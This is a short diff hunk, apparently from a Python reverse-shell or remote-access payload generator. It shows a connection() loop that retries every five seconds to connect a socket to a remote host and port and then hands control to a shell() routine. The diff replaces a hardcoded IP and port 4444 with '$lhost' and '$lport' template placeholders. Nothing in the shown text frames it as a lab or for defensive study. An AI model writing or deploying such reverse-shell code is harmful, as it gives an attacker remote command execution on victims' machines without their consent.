@@ -599,7 +599,7 @@ def connection():
     while True:
         time.sleep(5)
         try:
-            s.connect(('192.168.1.102', 4444))
+            s.connect(('$lhost', $lport))
             shell()
             s.close()
             break
